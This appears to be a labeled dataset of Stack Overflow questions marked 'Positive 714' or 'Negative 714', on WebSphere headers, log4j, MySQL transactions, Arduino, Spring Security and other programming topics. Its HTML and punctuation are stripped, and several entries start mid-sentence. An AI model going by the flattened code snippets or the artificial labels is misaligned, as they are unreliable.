Positive 714 pIm working on application scan using OWASP and got this report. what i think is that, to configure WAS to include the header in all response headers it theres a way. thanks in advance for all your answers. p  pVulnerability  The AntiMIMESniffing header XContentTypeOptions was not set to nosniff. This allows older versions of Internet Explorer and Chrome to perform MIMEsniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type.  Current early 2014 and legacy versions of Firefox will use the declared content type if one is set, rather than performing MIMEsniffing. p  pSuggested Solution  Set the XContentTypeOptions nosniff header for resources javascript, css, etc. that are directly served by the web server. This can be done through server configuration so this might involve documentation updates. p  pAffected URLs  resources  a hrefhttpscssacmetst.usmt0520.lpc.lawson.comssodomain.js relnofollowhttpscssacmetst.usmt0520.lpc.lawson.comssodomain.jsa  a hrefhttpscssacmetst.usmt0520.lpc.lawson.comssologin.css relnofollowhttpscssacmetst.usmt0520.lpc.lawson.comssologin.cssa p  hr  pWhat i did so far.p  pwhat i did is this. i place the tags right after commented out property modulesmodheaders.so and restart my appserver but still the same response header.p  precodeLoadModule headersmodule modulesmodheaders.so   ltDirectory modheaders.cgt       Header always set XContentTypeOptions nosniff  ltDirectorygt codepre

Positive 714 pI want to ask some information to tamtamy community to address an architectural choice. I work on a telecommunication suite, this is based on a proprietary development platform JEE7 oriented now named, DP. In the requirements analisys phase, a Customer required a strong integration of his ASIS services in the new products based on our DP. This integration is not a problem.. This topic is our matchp  pThe customer ASIS services are implemented in IBM RPG program language and they are deployed on a IBM  System I AS400. Actually they arent services but a plethora of programms interfaced with an instance of IBM DB2 database. The CRUD operations on database arent a problem we can use an ORM artifact. Now, were studing a way to interact with RPG programs. After a preliminary analysis we found different approaches, two are very interstingp  ol liJTOpen, it is a library of Java classes supporting the clientserver and internet programming models to a system running IBM i or i5OS or OS400.

Positive 714 pI have a web application, which uses log4j and slf4j as facade for logging. Logging is configured not from log4j.properties file, but from Java code. Application is running on three different machines using Websphere Application Server.p  pIssue is that on two instances logging works as expected. But on the third one nothing is written in my logfile. Output goes to SystemErr.log instead there are messages of ERROR and INFO levels.p  pInitially I thought that something is with Websphere server configuration, but later I found this link a hrefhttpwww.webagesolutions.comknowledgebasewaskbwaskb004 relnofollowhttpwww.webagesolutions.comknowledgebasewaskbwaskb004a which says that such situation can be when log4j.properties can not be read.p  pBut I am not using property file for this. And configuration form Java works OK on other two instances. Any ideas what can be the issuep  pThank you in advancep

Positive 714 pOne of our systems is build as a wrapper around a third party customized work flow product that we cannot change.p  pRecently we got a request to capture some user activity data which is persisted nowhere else than in the application logs. These logs files are quite a few spreading across multiple machines so analyzing those logs to extract the required info would be a relatively complex task. p  pCreating some aspects to audit those user actions was considered but was quickly ran out giving the amount of third party code you need to decompile and look at. There will also be security restrictions about activating loadtime weaving on production application servers.p  pMy initial idea was to redirect the log outputs we are interested in to a different file actually files and then analyze those files to process that data. This seems doable but when you start considering things you soon find a lot of issues to deal with when working with files logs rollover, no transactions, keeping a track of what was processed and what not, etc.p  pMy second thought was to implement a custom pattern layout and configure it to be used for the logs I was interested in. Easy to write, keeping it away from third party code in addition to sending the message to the log file will also save the log entry into a table. Once in the table I can do everything I want starting from there. Code fragment belowp  precodepublic class CustomPatternLayout extends Layout      private final PatternLayout patternLayout     private SimpleJdbcTemplate simpleJdbcTemplate      public CustomPatternLayout          System.out.printlnCreating CustomPatternLayout instance         patternLayout  new PatternLayoutmn         simpleJdbcTemplate  new SimpleJdbcTemplate...          ...     protected PatternParser createPatternParserString pattern          System.out.printlnCustomPatternLayout returning pattern parser         return new PatternParserpattern           public String formatLoggingEvent event          String log  patternLayout.formatevent         System.out.printlnCustomPatternLayout about to write log entry to the database   log         simpleJdbcTemplate.updateINSERT INTO mylogintracker logentry values , log         return log      codepre  pOnce this done I added it to my log4j.propertiesp  precodelog4j.appender.FILEorg.apache.log4j.RollingFileAppender log4j.appender.FILE.layoutmy.org.utils.logging.CustomPatternLayout codepre  pAnd I can see in the logs my system out entries sign that my custom pattern layout is created and configured. However the actual codeformatcode method never gets invoked and consequently I get nothing saved in my table. There are still lots of log entries in the logs and it looks like my custom pattern layout is not used.p  pI used this strategy before to make it possible to output thread id in the logs and it worked perfectly. I admit that was a standalone java application as opposed to this one which is running on a webshere application server.p  pAny idea about what would cause this and how to address it Alternative approach that will do the job without involving lots of technologiesp  pThank you in advance for your inputs.p

But that gives me problems such as not being able to select text dragging the mouse over this overlay just pans the map or scroll if the overlay has a div with overflowing text then scrolling causes the map to zoom in or out, clicking on the scroll bar will scroll but it will pan the map at the same time.p  pIm currently catching the mouseover and mouseout events to disableenable dragging and zooming but I still cant highlight text and now scrolling the mouse wheel on an area of the overlay that doesnt have anything to scroll causes page elements outside of the map to move up the window.p  pHas anyone else run into a situation like this I havent seen anything else that actually covers this and Im trying not to tear out my hair trying to find a solution.p

Negative 714 pI have an issue occurring in Microsoft Dynamics GP, and am doing research to see if this is the cause,but this could be a Access to SQL Server issue. GP stores data in SQL Server, and MS Access is being used to access the table data. Some data appears to be going missing in the production database. Unfortunately, I dont know what is being done with Access, as that is not being disclosed to me. A simple solution would be to tell them to stop using Access to verify if data still goes missing, but I would like to know of any documented issues before suggesting this.p  pSo in an attempt to give a best guess on what is happening, what does Access do when it is connected with SQL Server as back end Does it lock the tables What would have to be done to cause data to be missing or deleted If Access is the cause, what steps should be taken to resolve itp

Negative 714 pInput Graph G Output several independent sets, so that the membership of a node to all independent sets is unique. A node therefore has no connections to any node in its own set. Here is an example path.p  pSince clarification was called for here another rephrasalp  pDivide a given graph into sets so thatp  ol lipi can tell a node from all others by its membership in sets e.g. if node i is present only in set A no other node should be present in set A onlyp  pif node j is present in set A and B then no other node should be present in set A and B only. if the membership of nodes is coded by a bit pattern, then these bit patterns have hamming distance at least onepli lipif two nodes are adjacent in the graph, they should not be present in the same set, hence be an independent setpli ol  pExample B has no adjacent nodes DA, ADp  pSolutionp  ol liA B  li li B Dli ol  pA has bit pattern 10 and no adjacent node in its set. B has bit pattern 11 and no adjacent node, D has 01 therefore all nodes have hamming distance at least 1 an no adjacent nodes  correctp  pWrong, because D and A are connectedp  ol liA D B li li D Bli ol  pA has bit pattern 10 and D in its set, they are adjacent. B has bit pattern 11 and no adjacent node, D has 11 as has B, so there are two errors in this solution and therefore it is not accepted.p  pOf course this should be extended to more Sets as the number of Nodes in the Graph increases, since you need at least codelogncode sets.p  pI already wrote a transformation into MAXSAT, to use a satsolver for this. but the number of clauses is just to big. A more direct approach would be nice. So far I have an approximation, but I would like an exact solution or at least a better approximation. p  pI have tried an approach where I used a particle swarm to optimize from an arbitrary solution towards a better one. However the running time is pretty awful and the results are far from great. I am looking for a  dynamic algorithm or something, however i cannot fathom how to divide and conquer this problem. p
Negative 714 pI am new to iPhone programming. Coming from a .net background, I find Apples UIKit really difficult to use. For example, creating a simple static table view requires me to implement a lot of datasource and delegate methods.

Negative 714 pAfter reading an interesting article about unit testing behavior instead of state, I came to realize that my unit tests often are tightly coupled to my code because I am using mocks. I cannot image writing unit tests without mocks but the fact is that these mocks are coupling my unit test very much to my code because of the expect andReturn calls.p  pFor example when I create a test that uses a mock, I record all calls to the specific mock and assign return values. Now when I change the implementation of the actual code for whatever reason, a lot of tests break because that call was not expected by the mock, forcing me to update the unit test also, and effectively forcing me to implement every change twice... This happens a lot.p  pIs this issue intrinsic to using mocks, and should I learn to live with it, or am I doing something fundamentally wrong Please enlighten me  Clear examples coming with the explanation are most welcome of course.p

Negative 714 pWe have a product which is being slightly customized for each client.  The exact customization is unpredictable  we assume that any point in the code can become needing change.  However, we want to keep one code base, as 90 of the code will be identical, so we dont have to merge every update or new feature to each client separately.p  pHow can this be donep  pThe project is written in PHP with the Yii framework. p  pBasically, we would like something like this Every client will have a folder with a mirror of the code. That mirror will include only those classes customized for the client. Than, at runtime, the clients identity will be known, and every mention of classes name will be resolved to the generic version of the class  if no client specific version exists for this client, or to the client customized version of that class  if such a version does exist. p  pIll appreciate comments about the general design question.br Any comments on the above solution.br Are there other ways to achieve what I want to achievebr Maybe some code generation tool for generating the client specific version from the current main code  p  pAnd also there is the implementation question. How can this be implemented in PHP and Yiip  pI thought first to use PHPs autoload. However, it will anyway choose only one version of the class. And this is a problem, because well need to choose the client specific version every time except of one when defining the client specific version of the class, we will extend the general purpose version of that class. So classes version  can not be resolved at the loading time, both need to be loaded, and the client specific will be used every time except of one.p  pThank youp

I suspect this is inefficient, tho my questions remain the same...p  ol liWhen I load a user profile from Core Data, will is also load all ten levels, as well as the 30 puzzles for each level into memory  I ask because I obviously dont need all that data if the player is only playing one level at a time.  li liIf all the level and puzzle data is loaded into memory when the user profile is loaded, how can I lazy load the level and puzzle data as its needed  li liWhen I run my game using the Allocations instrument, it shows its using 6MB of Overall memory when the app is fully loaded and sitting in the main menu.  Obviously, the memory usage increases as the user dives deeper into the navigation stack. Is 6MB considered a lot of memory for an app that just started  li liIve noticed that when I comment out the line of code that loads the Users profile from Core Data, 6MB is still used.  Does this mean the impact that my Core Data objects have on memory are negligibleli ol  pI apologize if these are outrageous questions and I apologize for their length, and thanks so much for your wisdom  Im heading back to the Core Data docs right now, I just thought Id post these questions while I continue the selfteaching.p

Negative 714 pThis was posted at a hrefhttpcaliburnmicro.codeplex.comThreadView.aspxThreadId244394 relnofollowCaliburn.Micro discussionsa also. Im really looking for advice and opinions on the best way to solve.p  pSay I have the following Actionp  precodepublic IEnumerableltIResultgt SaveStation       yield return Busy.MakeBusy     yield return new StationSavestation     yield return Busy.MakeNotBusy     yield return Show.TabltStationBrowseViewModelgt  codepre  pStationSave is an IResult wrapper around a simple WCF service invocation. The service uses FaultContractFaultException for failures.p  pIn the case of a fault, the user needs to be notified and the FaultContract will contain some useful info about what went wrong. Currently the Save result catches the exception and inserts it into ResultCompletionEventArgs of the Completed event. By doing so, the SequentialResult created by the pipeline is cancelled because of the error, thus leaving the screen in a Busy state.p  pWhat Im really after is ideas about the best way to recover from the error remove the busy state and notify the user I have a couple of IResult implementations for different styles of notification which I would like to use of the details provided in the fault contract. By attaching to the Completed event in my VM I can get the error, but at this point I am no longer in the context of the Action pipeline so any IResults I would like to use the MakeNotBusy and my show notification implementation I have to execute manually and Id have to new up my own ActionExecutionContext which I dont want to be doing.p  pI have had a look at Marco Amendolas rescue filter for Caliburn.Micro from a hrefhttpmarcoamendola.wordpress.com20100810acaliburnmicrorecipefilters relnofollowherea, but again I cant pass back IResults from the Rescue method.p  pHave I missed something obvious How do others handle this situationp

An example would be a user holds their device in portrait mode and spins their phone, I would like the horizon on the phone to match the natural horizon. I have played with the roll value returned from the sensor manager but it seems to take pitch into account ie. the device is now in landscape mode, what should be pitch affects roll.p  pAlso, when reading pitch, I would like the horizon to move up and down, regardless of roll.

Negative 714 pNow this is going to be a little weird usecase. Maybe someone has some ideas.p  pstrongBackgroundstrongp  pIm writing a website that is very AJAX intensive. In fact there are hardly any full page reloads. This implies that a lot of template composition is done on the client side. For the moment I use some self written scripts in jQuery. To keep things reasonably simple I only use variable placeholders, like this code somevar.someattr.someotherattr code. I could probably use something like mustache to achieve a similar behaviour.p  pOn the other hand, from time to time I like to be able to do some composition on the server side. Im looking for a way to avoid pointless code duplication on the client amp server side.p  pstrongIdeastrongp  pId like to be able to render Django templates in such a way, that certain gaps in the output would remain untouched. More specifically if a given variable is not supplied in the template rendering context, then the placeholder should still read code contents code. I wonder whether this or a similar behaviour is possible to achieve using filters andor tags.p  pI could just write code somevar.someattrdefault somevar.someattr  code, however this isnt very DRY.p

Negative 714 pI am starting my internship on a Home Server able to control mutliple domotics equipments from a web page. The global idea is that based on a click on a button, a certain script is spawned on the server and controls a microcontroller.p  pMy tutor built a simple website he gave me, using AJAX to always stay on 1 page, and brings the menus according to user actions they are hidden if not used, brought back to front if used.p  pI have set up an apache server which I configured to execute CGI scripts, and it works. To always stay on one page, I used the 204 No Content return trick, so that the servers answer to the page is I dont have anything to say, just stay on this page.p  pBut the one problem I have is that the CGI is launched only once. If I click the button for the first time it works, afterwards nothing happens.p  pI tried using the SSI shtml to use the  in a button code instead of using a FORM with GET method but the script still wont execute twice.p  pI might be using the wrong tools.

I used a basic link,  and for some reason it has a different behaviour than using a button. Whatever. My interrogations on the technologies used still stand though p  pEDIT2  My solution is crappy, for some reason the script is also called at page refresh or when the page loads for the first time. Its strange, because since its in the  it should only be spawned when I click on it ...p

The problem comes when using runtime dynamic linking. I load up this DLL, use it, and then in some instances I need to unload it from my processs virtual address space and then continue running. When I call FreeLibrary on the thirdparty library, it does some cleanup work i.e. in a hrefhttpmsdn.microsoft.comenuslibraryms68258328vvs.8529.aspx relnofollowDllMain when DLLPROCESSDETACHa is called. While its doing its cleanup, it causes an exception to be thrown which it doesnt handle, and bubbles up as an unhandled exception to FreeLibrary. This results in the call failing and the module remaining loaded.p  pIve put a ticket in with the vendor so hopefully I can get a fix which will allow this specific library to unload successfully. In case I dont however, and for the general case of this issue, Im curious as to what the options are.p

Negative 714 pA little background At runtime I would like to be able to inspect the currently called functions javadocstyle documentation, to determine its formal typed declaration. This would allow runtime type checking for simple and complex types by means of reflection at a cost during debugging and testing, something that I would find immensely helpful.p  pSo, in php I would like for a user defined function to get called whenever any other function is about to get called. That is, if a function foo gets called, I would like to have my callHookHandler function called immediately before.p  pOne solution would be to implement call in all user defined classes, but that is both unwieldy and doesnt include support for functions defined outside classes, so I am looking for a better solution.p

However, it will not include the score received by the awards.p  pI was thinking of replacing the codeQuestionHistorycode entity by another entity, for example codeUserActivitycode, which will store any activity for this userp  ul liwhen he answers a question, with the resultli liwhen the player submit a new questionli liwhen he wins an awardli lietc.li ul  pThe structure of this entity may look likep  precodeEntity public class PlayerActivity extends Model       public User user     public Date activityDate     public ActivityType type  Define the type of activity QUESTIONANSWERED, AWARDRECEIVED, QUESTIONSUBMITTED, etc.     public int score  Points won by this activity.   codepre  pWith such entity, I would be also able to display an activity history like the one provided on SO site ex a hrefhttpstackoverflow.comusers22656jonskeettabactivityhttpstackoverflow.comusers22656jonskeettabactivityap  pWhat do you think of that new proposition, or is there a smater way of doing thatp

This is how i did it initially, and perhaps i didnt do it correctly but it was a performance hit because Above example is simple, but in my case, i have 15 properties such as continent above that i need to aggregate my data on. If i create a country dimension, and specify those 15 properties as dimensional attributes, every time i process my cube, it will do a select distinct continent from country x15 once per each attribute in order to get that distinct list of continents. if Country table is huge which in my case it is a view comprised of many big tables, it will take a very long time just to get that list of distinct values per dimension. p  pmy attempt above is just a way to work around this problem, and have separate table per dimension that i could easily manage. my only problem is that i have sub views which need to be aggregated on those properties, while the properties do not exist on sub tables and need to be looked up from country view etc.. p

Negative 714 pAs the title states the way one groups classes in PHP compared to for example Java, is it supposed to be different I am currently reading OReillys book OOAampD and in the chapters Ive learned to use one class for each specific task and not one class for a grouped thing. Recently, I looked upon some code for a calendar, and the class was thousands of lines and had everything inside it that was to be used. However, this feels to me like its violating the point of having many objects doing one task, but seeing as PHP is web development, is it supposed to be different E.g. monsterclasses.p

Negative 714 pI use Spring Security 3 in my JSF2 webapp.p  pI have a security rule to provide session timeoutsp  precodeltsessionmanagement invalidsessionurlfacespaginasautenticacionlogin.xhtmlerror1 gt codepre  pSo that when the session has expired and the user clicks on any link, he is redirected to the login page. In this page I check for the error param, and show a message to the user saying the session has expired.p  pBut I have 2 problemsp  p1 When I startup the app the first time it tries to show the home page, Im redirected to the login page saying session has expired. I think that this may be happening because the 1st time you run the app, the session is a new one, and Spring Security perhaps thinks he has expired doesnt distinguish betwen a new session and a timeout.p  p2 If the session has expired for anonymous users not yet authenticated, Im redirected to the login page timeout too. I dont want this behaviour for nonauthenticated users, I just want to check the timeouts for authenticated users.p  pHow can I solve both of these problemsp  pThank you in advance.p

Negative 714 pIm working on a game project in Java in which I need to be able to play multiple sounds at the same time in real time. Ive implemented a sound system that generates new threads to play SourceDataLine sounds on. p  pThe game works completely fine on my computer, but for one of my testers, the sound system keeps crashing on him at random intervals. Were both running the same version of java jre 1.6.029 on Windows 7, and after several rounds of testing and googlesearching, I havent been able to figure out why it always works fine for me, but crashes on him. p  pHere is an SSCCE demonstrating the part of my code where my problem is occurring.

Negative 714 pSo Ive inherited a large c code base which does a lot of mysql work.  strongThe code always disables autocommitstrong and tends to have functions which look like thisp  precodeint function      ifmysqlrealqueryconn, ...          return 1           ifmysqlrealqueryconn, ...          return 1           mysqlcommitconn     return 0  codepre  pObviously, the intention here is that the commit only happens if the queries are successful. But what happens if one of them isnt Eventually, the mysql connection is properly closed, but there is no rollbacks in the code.p  pSo when it closes, will it basically just commit any changes that were successful Or will it rollback as if nothing happenedp  pMy gut says that it makes sense to have a rollback if the second query fails in order to undo the successful first query. So this function ends up be transactional.p  pOf course, I find this code to be inherently broken because later other mysql code could do a commit leaving things in a weird state if some previous work failed. But before I go and change the behavior of the program, I wanted to make sure I understood what the current behavior was.p

In my example, I give three jimmy, mark and bobby but there may only be one or there may be 20.p  pSecond question is this wise I know that reducing the number of queries is desirable but is it worth it here Should I just set up a for loop and loop through, alternately checking if a value exists and inserting if it doesntp  pThanks for any help.p  pSorry I dont have code that Ive tried myself to show, Im not even sure what to try here.p  pstrongUpdatestrong added an extra column to the table. I wanted to keep things simple but need two columns to illustrate the fact that deleting a row and then inserting or updating are not what I want as they would favor the users input over what is already in the table.p

Negative 714 pIm using Eclipse Indigo SR1 with JDK 1.7, on Windows 7 Pro. Ive written a desktop app, Swing based.p  pMy app includes a JTable it shows many records of type T, one row per record. The table model points to Vector vect, named vect, containing all data to be shown in the JTable.p  pThe app includes a combo, named sele, showing three values 0, 1, 2.p  pWhen sele  0, every record of vect has to be visible in the JTable.p  pWhen sele  1, the JTable has to show only vect records having odd row index and all records with even row index mustnt be visible. Viceversa, when sele  2.p  pSo, heres my question how can I make a row not visible in the JTable  I cant use the table model, because it points to vect that contains all data.p  pI tried a table cell renderer, but it seems that you can set the color of a cell, but you cant set it not visible or modify its size.p  pIve tried another way if r is the row index, and I want that row to be not visible, I write table.setRowHeightr,0, but this instruction throws an exception, the height cant be set to zero.p  pI could solve the problem by splitting the data, dividing vect in two, but I dont like that.p  pDoes anybody have an idea p  pthanx in advance, Williamp  pPS someone told me to create a filtering TableModel that wraps the existing TableModel. The filtering model would be sensitive to the filtering criteria and fire the appropriate methods TableDataChanged when the filter was changed. The getRowCount method would return the filtered count. The getValueAt method would map the filtered row to the actual row in the underlying TableModel.p  pMah, perhaps its a good idea, but frankly Im not able to understand it...p
Negative 714 pIn a web application I need to execute file conversion as example from jpeg to pdf when a local file is uploaded to the server. br I decided to delegate this task to a console application in order to detach it from the general web application.

Negative 714 pIll first explain my overall goal and then the question itself.p  pOverall Goalp  pTo send commands to an Arduino board that is connected to a router. A computer will be connected to the router over wifi. The Arduino will serve a local website that the computer will use to send key presses to the Arduino. Depending on the key press, the Arduino will behave in some way.p  pOne way to send commands to the Arduino is to use the Parameters that are at the end of a URL of the website the Arduino serves. The Arduino can read these parameters. I have no problem with this. p  pThe Arduino is able to serve a website coded with JavascriptHTMLCSS etc..p  pQuestionp  pI have been in Javascript for a week but so far I have the below codep  precodeltDOCTYPE htmlgt lthtmlgt ltheadgt  ltscript typetextjavascriptgt   function Submit  document.forms[myform].submit   document.onkeydown  functionevent  var keypress  String.fromCharCodeevent.keyCode var keycode  event.keyCode document.getElementByIdkp.innerHTML  keypress     document.getElementByIdkc.innerHTML  keycode var tsetTimeoutSubmit, 500              ltscriptgt ltheadgt   ltform namemyform methodGETgt  Key Pressed  ltspan idkp nameKPgtltspangt ltbr gt Key Code  ltspan idkc nameKCgtltspangt   ltformgt lthtmlgt codepre  pWith this, I am able to see the Key codes of the keys from the keyboard that I hit. The website will see the key press, output the key code and actual key.p  pI put the set timeout function in there so the page is refreshing at a slower, constant rate while Im holding a key.p  pI know some things in HTML will create and manage the parameters on their own. For instance, the drop down boxes. From my understanding, when drop down boxes are put into the p  precodeltform methodGETgtltformgt  codepre  ptag, you can create parameters. Also text boxes will do this same thing. Then if one submits the webpage, then the adjusted values in these objects will appear in the parameters of the URL. p  pHowever, I cant figure out how to output the value of the key code to an object, then submit the page to copy the values to the URL parameters in REAL time. p  pBy real time I mean to continue to send a command while Im pressing up for instance, and to stop when I release.p  pI was able to do a crude version of this by typing a letter into a text box, and using a submit button to enter the value into the URL parameter. I cant include up or down arrows with this however, and I wanted the webpage to submit on its own in real time.p  pstrongTLDR strong How can I use the key codes from the keyboard to control the parameters in a URL in Real Time p  pThank you very much for reading this. All responses are greatly appreciated.p  pstrongEDIT 51512strong webbod gave me some helpful code. Here is the new code in its entiretyp  precodeltDOCTYPE htmlgt lthtmlgt ltheadgt  ltscript typetextjavascriptgt   function Submit    document.forms[myform].submit   document.onkeydown  functionevent  var keypress  String.fromCharCodeevent.keyCode var keycode  event.keyCode document.getElementByIdkp.innerHTML  keypress  var tsetTimeoutSubmit, 500             ltscriptgt ltheadgt  ltbody onLoaddocument.myform.KP.focusgt ltform namemyform methodGET actionENTER URL HEREgt Key Pressed  ltinput typetext idkp nameKPgtltspangt  ltformgt ltbodygt lthtmlgt codepre  pI had the webpage focus onto the text box. Without it, I had to click on the text box, and then the code would finally register. p  pHow this performs as it stands When the webpage loads, the page will automatically focus on the text box. It waits for key press. Press a key the page will load the letter to the parameters to the URL half a second later You can make it respond quicker with the setTimeout. The key will stay there in the parameter until another key is pressed.p  pI know beggars cant be choosers, but I wanted this to perform video game style where an action is carried so long Im pressing a key, and the action stops the moment I release the key. In this case if you hold down a key, the text box will fill with letters, then submit. This wouldnt work because I would like for the Arduino to look for individual characters, not a list of characters. However this is really great so far. I most certainly wouldnt mind implementing this.p  pHowever I have been doing a lot of research with socket communication as mentioned by Tim. This seems like a great path to take, the Arduino Ethernet Shield uses a UDP library, and so far my only difficulty is setting up the client end. Arduino is the Server. Anything with this happens, I will make an edit.p

Negative 714 pI am using Javascript to drag and simulate rotating an image by using multiple frames showing the image in 360 degrees. I am relatively new to JavaScript and am having a hard time with the script in trying to insert a trigger that would cause overlaying images to fade in and out when certain frames degrees of the image are displayed. For example, when I drag, rotate and reveal the front side of the image, lets say a range of frame 10 to frame 45, 4 popup labels will fade in simultaneously and remain visible until I drag and rotate the image away from that range of frame, causing the labels to fade out. On the backside of the image I would like to have 3 popup labels appear once any frame within the acceptable range of frames are displayed, lets say, frames 95 through 135.

I may add that later.p  pAdditionally, trying to browse to coderootpathcode while already authenticated should immediately forward the request to codehomepathcode. codehomepathcodes page will include a link to log out, the effect of which should immediately send the user to coderootpathcode.p  pMy questionp  pWhat would the routes.rb entries look like to set this up Assuming I have a codeUserscode controller and a codeSessionscode controller, and assuming that I already have commandline authentication via the irb console working, what is the correct combination of routes and controller methods that gets this system working Im very confusedp  hr  pIn case it helps, here is what I have so far, but Im so lost that I cant even get this in to a working state to test it.p  pI have a routes file that looks likep  precodeMyAppRailsApplication.routes.draw do   resources sessions, only [new, create, destroy]    root to sessionsnew   match signout, to sessionsdestroy, via delete   match home gt usershome end codepre  pThe UsersController only has a codehomecode method, and the SessionsController has codenewcode, codecreatecode, and codedestroycode methods.p  pIm particularly stuck in that I dont know where to send the signin form to  I figure it should point at codesessionsnewcode somehow but I dont really get how that works.p  pThanks.p

Negative 714 pWhat Im trying to do, is to insert specific data, from an sql table into an excel worksheet. I have an sql table which looks like thisp  precodeofficename   currencyname   buy   sell    datetime office1      currency1      11    12      2012.08.23 1000 office1      currency2      10    11      2012.08.23 1000 office2      currency1      11    12      2012.08.23 1000 office2      currency2      10    11      2012.08.23 1000 codepre  pI would like to insert these data by mainly by the officename and the datetime criteria.p  pstrongThe officename should have this role when I insert itstrong For example Im at the first office1 line in the sql table, which can be found in an excel table row too every officename is in one row in the excel sheet, you can see it at the bottom. If its found the officename in the excel tables row, than it will check the currencyname which is the next column in the sql table and when it finds it too in the excel tables column, then it inserts the buy and sell value into the cells next to it. Note that in the sql table an officename can be found multiple times, so I think this checking thing should be done on every sql table line. p  pstrongThe datetime should have this role when insertingstrong I think it should be done before anything else. Because only those lines have to be inserted, which have the newest datetime. For example if theres a datetime which is 2012.08.23 1000 and theres a few other one with 2012.08.23 1001 Then it will only insert those which have the newest time value 2012.08.23 1001. So some kind of sql select query would do this job by selecting only those which have the newest date.p  pTo better understand the whole thing, Ill show you how the excel table looks likep  precode                   office1      office2 currency1   buy                     sell         Currency2   buy                     sell         codepre  pIm not forced to do it in this way as I described, the main thing is to copy paste the sql table datas to the correct excel table cellsp  pIf someone could lend me a hand in it I would be gratefullp

Negative 714 pOur application requires all worker threads to synchronize at a defined point. For this we use a codeCyclicBarriercode, but it does not seem to scale well.

It is about writting a char filled with 1 and 0. it can then be converted to a short, and results depends on endianess, little or big. Here is the example, quoted. p  blockquote   punsigned char endian[2]  1, 0       short xp  precodex  short  endian codepre      pWhat would be the value of x Lets look at what this code is doing.   Youre creating an array of two bytes, and then casting that array of   two bytes into a single short. By using an array, you basically forced   a certain byte order, and youre going to see how the system treats   those two bytes. If this is a littleendian system, the 0 and 1 is   interpreted backwards and seen as if it is 0,1. Since the high byte is   0, it doesnt matter and the low byte is 1, so x is equal to 1. On the   other hand, if its a bigendian system, the high byte is 1 and the   value of x is 256.p blockquote  pi wonder when you are instantiating an array with a given number of memory bytes allocation here, two bytes, how can conversion be done to any type short, int... as long as the array has been allocated the number of bytes corresponding to this byte if not enough memory has been allocated to contain this type, will the next memory address still be read  for instance if i want to cast endian to a long, will this be performed, reading four bytes from the beginning of endian, or will this fail p  pThen, a question on endianess this is a characteristic of processor regarding habits to write bytes in memory with most significative byte at lowest memory location big endianor at highest memory location little endian. in this case, an array with two onebyte element has been allocated. why is it that 1 is said the most significative byte p

Negative 714 pSo, I am trying to create a vertical navigation menu that includes a stack rows of navigation items. When one of these rows is selected, I want a menu to slide out from above and beneath and when the top of this sub menu reaches the bottom of the row that was clicked. These sub menus should also have a starting position where the sub menu bottom is equal to the related navigation item bottom, so that upon animate downward, it is immediately visible. p  pThis positioning, the stop and start points, can be seen in this fiddle   a hrefhttpjsfiddle.netpGfCX57 relnofollowhttpjsfiddle.netpGfCX57a. Just take note of the start and end points. The rest of the fiddle is broken due to the nature of positionrelative. p  pI thought that zindex could fix the pushing of the subsequent navigation items as you can see in the fiddle just linked... however that doesnt seem to work. It looks like only positionabsolute will enable the proper overlapping i.e. sub menu hides beneath the elements above it and covers those below it. Unfortunately, this has its faults as well. As you can see in this fiddle a hrefhttpjsfiddle.netpGfCX60 relnofollowhttpjsfiddle.netpGfCX60a. You will notice that the starting position and ending position is always the same because Im using the same class every time. Although I could specifically position every single sub menu as its own unique ID, that would be very inefficient and difficult to maintain.p  pBsically, I need a mix of the two approaches... relative positioning for the startend positions and absolute to enable the proper overlapping.p  pHopefully this makes sense... I really need help. Im stuck with the two approaches and neither working. Its frustrating. p  pHere is my current jQuery codep  precode.row.clickfunction        make all siblings AFTER row clicked get this class to reduce zindex and allow the menu to display above these rows while still remaining below the rows above      this.nextAll.addClassrowZ     this.next.menu.show     this.next.menu.animatetop0     when menu is out, the row clicked is the header row, upon clicking this, the related menu and by default, all subsequent menus within animate back up and hide  .rowHead.clickfunction       this.next.menu.animatetop100     this.next.menu.hide   codepre  pAny and all help is greatly appreciated. Thanksp  pstrongEDITstrong New approach... menu within the navigational item, to allow it to have absolute positioning and be relative to the navigational item. However, the zindex seems off i.e. its animating over top the navigational item its parent though the zindex would suggest otherwisep  pa hrefhttpjsfiddle.netpGfCX81 relnofollowhttpjsfiddle.netpGfCX81ap

Negative 714 pWhen I add items to my list by clicking the add series button it causes my list to not sort properly. E.G. If I click the add series button and then try to move seriesname232 inbetween items trrde and 1, then it will move it down one more than it should below the 1. I believe that this is because the sortable list isnt taking into account that something was added to it.

Negative 714 pI have a fairly large InnoDB table which contains about 10 million rows and counting, it is expected to become 20 times that size. Each row is not that large 131 B on average, but from time to time I have to delete a chunk of them, and that is taking ages.

I can imagine that the index rewriting overhead makes these queries very slow. p  pI am developing an application that will run on preexisting databases. I most likely have no control over server variables unless I make changes to them mandatory which I would prefer not to, so Im afraid suggestions that change those are of little value.p  pI have tried to codeINSERT ... SELECTcode those rows that I dont want to delete into a temporary table and just dropping the rest, but as the ratio of todelete vs. tokeep shifts towards tokeep, this is no longer a useful solution. p  pThis is a table that may see frequent codeINSERTcodes and codeSELECTcodes in the future, but no codeUPDATEcodes. Basically, its a logging and reference table that needs to drop parts of its content from time to time.p  pCould I improve my indexes on this table by limiting their length Would switching to MyISAM help, which supports codeDISABLE KEYScode during transactions What else could I try to improve codeDELETEcode performancep  pbEditb One such deletion would be in the order of about one million of rows.p

Negative 714 pId like to share several numpy arrays between different child processes with pythons multiprocessing module. Id like the arrays to be separately lockable, and Id like the number of arrays to be dynamically determined at runtime. Is this possiblep  pIn a hrefhttpstackoverflow.coma7908612513688this answera, J.F. Sebastian lays out a nice way to use pythons numpy arrays in shared memory while multiprocessing. The array is lockable, which is what I want. I would like to do something very similar, except with a variable number of shared arrays. The number of arrays would be determined at runtime. His example code is very clear and does almost exactly what I want, but Im unclear how to declare a variable number of such arrays without giving each one of them a hardcoded name like codesharedarr1code, codesharedarr2code, et cetera. Whats the right way to do thisp

Negative 714 pI am porting a library to a PCL and have to find a solution for managing HTTP request credentials. I took away concrete credentials classes like CredentialCache that is not portable and is now only using ICredentials, so client applications may create proper credentials and just send an interface reference.p  pHowever one thing still needs to be resolved. On some platforms HttpWebRequest has a neat PreAuthenticate property that takes care of initial handshaking. Without it the client needs to catch and repsponds to 401 responses. But PreAuthenticate is not a part of most of PCL profiles, and I wonder if there is any resolution to that or the client will need to implement replacement logic itself which is silly since this is a standard piece of code.p  pThanks in advancep

